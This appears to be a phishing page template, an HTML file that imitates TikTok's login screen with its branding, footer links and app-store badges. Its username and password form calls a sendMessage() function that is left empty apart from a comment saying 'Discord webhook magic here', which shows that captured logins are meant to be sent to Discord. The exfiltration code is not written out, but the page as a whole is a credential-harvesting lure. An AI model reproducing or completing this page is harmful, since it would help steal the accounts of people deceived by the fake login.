<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/x-icon" href="your-tiktok-logo.png">
  <title>TikTok</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <span id="root">
    <section class="section-all">
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="vecteezy_tiktok-png-icon_16716450.png" alt="TikTok">
                </div>
                <div class="form-wrap">
                  <form class="form">
                    <div class="input-box">
                      <input type="text" id="username" placeholder="Username or Email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                    </div>
                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>
                    <span class="button-box">
                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                    </span>
                    <a class="forgot" href="https://www.tiktok.com/forgot-password">Forgot password?</a>
                  </form>
                </div>
              </div>

              <div class="login-box">
                <p class="text">Don't have an account?<a href="https://www.tiktok.com/signup">Sign up</a></p>
              </div>

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/tiktok/id835599320?mt=8">
                    <img src="your-ios-badge.png">
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.zhiliaoapp.musically">
                    <img src="your-android-badge.png">
                  </a>
                </div>
              </div>
            </div>
          </article>
        </div>
      </main>

      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="https://www.tiktok.com/about">About Us</a></li>
              <li><a href="https://support.tiktok.com">Support</a></li>
              <li><a href="https://newsroom.tiktok.com">Newsroom</a></li>
              <li><a href="https://careers.tiktok.com">Careers</a></li>
              <li><a href="https://developers.tiktok.com">Developers</a></li>
              <li><a href="https://www.tiktok.com/legal/privacy-policy">Privacy</a></li>
              <li><a href="https://www.tiktok.com/legal/terms-of-service">Terms</a></li>
            </ul>
          </nav>
          <span class="footer-logo">&copy; 2024 TikTok</span>
        </div>
      </footer>
    </section>
  </span>

  <script type="text/javascript">
    function la(src) {
      window.location = src;
    }
  </script>

  <script>
    function sendMessage() {
      // Discord webhook magic here
    }
  </script>
</body>
</html>
